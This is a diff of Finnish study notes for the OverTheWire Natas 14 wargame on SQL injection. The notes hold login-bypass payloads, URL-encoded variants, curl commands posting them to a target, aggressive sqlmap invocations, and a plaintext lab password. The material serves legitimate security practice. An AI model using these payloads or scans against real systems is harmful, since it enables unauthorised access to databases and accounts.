@@ -133,32 +133,6 @@ esim: `' OR 1=1 /*'`
 - Vahvistaa että kyseessä on injektio testaamalla SLEEP, ORDER BY, jne. <br>
 - Käyttää automatisoituja työkaluja kuten sqlmap <br>
 
-## Harjoitusta kohti mestariksi
-
-Alkuum meneekin `' OR 1=1 --` - koska se on perusideana mikä lähtee harjoittelusta. Sitä näkee nopeasti, reagoi järjestelmän jollakin tavalla, että onnistuuko kirjautuminen vai tuleeko virhettä, jäätyykö pyyntö ja tms. Tämä periaatteessa toimii kuin ensimmäinen _pingi_ eli testaa onko järjestelmässä injektiota. 
-
-Periaatteessa tämä `' OR 1=1 --` - voi toimia pienenä lunttilappuna ja pikaisella koodina.
-
-Jos taso menee vaikeammaksi niin lomake kenttään käytä suodatusta  ' - merkkiä 
-
-Muita vaiheita tulee mukaan:
-- Blind SQLi (testataan vaikka `AND 1=1` vs. `AND 1=2` ja katsotaan käyttäytyminen)
-- Time-based SQLi (esim. `SLEEP(5)`-pohjaiset injektiot)
-- Automatisointi (sqlmap) kun payloadit monimutkaistuvat
-
-
-## SQL injektio kali linux:issa
-
-`curl "http://target.site/login?username=admin' OR 1=1 --&password=whatever"`
-
-```
-curl -X POST http://target.site/login \
-  -d "username=admin' OR 1=1 --&password=whatever"
-```
-
-**Sqlmap** - joka antaa automaattisesti erilaisia sql injektio, et tunnistaa classic/blind/time-based ja union pohjaisia, jne.
-`sqlmap -u "http://target.site/login?username=admin&password=test" --batch --risk=3 --level=5`
-
 
 ---
 
@@ -212,6 +186,16 @@ username=admin" OR 1=1 --
 password=admin
 ```
 
+Pientä tarkennusta koskien miten tämä toimikaan (vscode muistiinpanoa) ja tämä **testi9**: 
+`http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin%22%27%20OR%201%3D1%20--&&password=admin%27%20OR%201%3D1%20--%22`
+
+dekodaattu menisi näin: 
+```
+username = admin"' OR 1=1 --
+password = admin' OR 1=1 --"
+```
+
+<br>
 **TESTI10** ,  tämä on sama idea kuin _testi9_ , mutta mentiin lomakkeen formaattin kautta kirjauttumisen prosessilla. Molemmat ovat samoja sisältöjä, mutta eri kuljetusmuoto. 
 
 Alemman pieni toisto:
@@ -224,7 +208,9 @@ password' OR 1=1 --"
 ![alt text](./kuvat-level11-15/natas14-15.png)
 
 
-## SQL injektio mini huomio - START HERE 
+---
+
+# SQL injektio mini huomio - START HERE 
 
 pieni huomiona tämä osuus:
 
@@ -239,6 +225,115 @@ pieni huomiona tämä osuus:
 
 
 SQL injektiossa idea on just nämä erikoismerkit kuten `"` , `'` , `"'`, `+` ja `--`. Huomoina toi keskimmäinen just pätee yhdistettynä, ja niiden yhdistelmeitä testeissä ja se pätee sekä lomakkeessa että URL:issa. 
+
+- Tässä tapauksessa **"** (`%22`) sulkee `username`-kentän alkuperäisen arvon ja sen jälkeen **injektio toimii**: `OR 1=1 --` on SQL-lauseke, joka on tosi ja estää salasanan tarkistuksen.
+
+
+## Harjoitusta kohti mestariksi
+
+Alkuum meneekin `' OR 1=1 --` - koska se on perusideana mikä lähtee harjoittelusta. Sitä näkee nopeasti, reagoi järjestelmän jollakin tavalla, että onnistuuko kirjautuminen vai tuleeko virhettä, jäätyykö pyyntö ja tms. Tämä periaatteessa toimii kuin ensimmäinen _pingi_ eli testaa onko järjestelmässä injektiota. 
+
+Periaatteessa tämä `' OR 1=1 --` - voi toimia pienenä lunttilappuna ja pikaisella koodina.
+
+Jos taso menee vaikeammaksi niin lomake kenttään käytä suodatusta  ' - merkkiä 
+
+Muita vaiheita tulee mukaan:
+- Blind SQLi (testataan vaikka `AND 1=1` vs. `AND 1=2` ja katsotaan käyttäytyminen)
+- Time-based SQLi (esim. `SLEEP(5)`-pohjaiset injektiot)
+- Automatisointi (sqlmap) kun payloadit monimutkaistuvat
+
+## SQL injektio kali linux:issa
+Tämä pätee `curl`- komento POST-pyyntö SQL-injektiolla:
+
+`curl "http://target.site/login?username=admin' OR 1=1 --&password=whatever"`
+
+```
+curl -X POST http://target.site/login \
+  -d "username=admin' OR 1=1 --&password=whatever"
+```
+
+Tämä on alempi komennon kuvausta tarkennuksena: 
+-X POST: tehdään POST-pyyntö
+-d: data, joka normaalisti tulisi lomakkeesta:
+--compressed: pakkaustuki, joskus tarpeen Overthewire-labroissa
+```
+curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
+  -X POST "http://natas14.natas.labs.overthewire.org/" \
+  -d "username=admin\" OR 1=1 --&password=irrelevant" \
+  --compressed
+```
+
+
+**Toinen vinkki**: tarkalleen mitä kysely tekee: 
+```
+curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
+  -X POST "http://natas14.natas.labs.overthewire.org/?debug=1" \
+  -d "username=admin\" OR 1=1 --&password=irrelevant"
+```
+
+
+**Sqlmap** - joka antaa automaattisesti erilaisia sql injektio, et tunnistaa classic/blind/time-based ja union pohjaisia, jne.
+`sqlmap -u "http://target.site/login?username=admin&password=test" --batch --risk=3 --level=5`
+
+## Selaimen SQL injektio
+
+` " ` - kokeilin toista erikoismerkkiä, mutta ainakin toimii ja antoi seuraavan vihjeensä, sekä muutama testi ainakin näyttävän toimii.
+
+```
+Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
+```
+
+Kun käytät SQL-injektiota URLin kautta, sinun täytyy URL-enkoodata erikoismerkit, jotta ne menevät palvelimelle oikein — muuten selain tai palvelin tulkkaa ne väärin tai estää pyynnön kokonaan.
+
+`' OR 1=1 --`- on enkoodattuna muodossa `%27%20OR%201%3D1%20--`
+
+
+🔎 Miksi enkoodata?
+Web-palvelimet ja selaimet odottavat, että URL:ssa on vain tietyt sallitut merkit. Jos laitat esimerkiksi ' (heittomerkki) suoraan URLiin, se voi rikkoa pyynnön tai aiheuttaa virheen jo ennen kuin se ehtii tietokantaan asti.
+
+esim. `curl "http://example.com/login.php?username=admin%27%20OR%201%3D1%20--&password=whatever"`
+
+Esim. tässä Natas 14 harjoituksessa: `http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin&&password=admin%22%20OR%201=1%E2%80%93%20&&password=admin`
+
+## SQLMAP komento
+
+tehokkuus ja laajuus säädetään sqlmapissa --level ja --risk -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.
+
+Asetus	Merkitys
+--level=1-5	- Kuinka laajasti testataan parametreja (1 = nopea, 5 = kaikki mahdolliset)
+--risk=1-3	- Kuinka "riskialttiita" hyökkäyksiä käytetään (1 = turvallisia, 3 = voivat rikkoa)
+
+**ESIM**:
+SQLMAP komento POST-pyyntö esim:
+```
+sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
+  --auth-type Basic --auth-cred "natas14:YOURPASSWORD" \
+  --data="username=admin&password=admin" \
+  --level=5 --risk=3 --batch
+```
+
+🧠 Selitykset:
+-u: URL-osoite (ei tarvitse query-parametreja tässä, koska käytetään --data)
+
+--auth-type Basic: HTTP Basic Auth
+
+--auth-cred: käyttäjä:salasana
+
+--data: POST-data, jota lomake lähettää
+
+--level=5: testaa kaikki kentät ja mutaatiot
+
+--risk=3: kokeilee myös vaarallisempia hyökkäyksiä (esim. viiveet, tiedonhaku)
+
+--batch: automaattivastaukset (ei kysy interaktiivisesti)
+
+
+
+
+
+
+
+
 
 
 
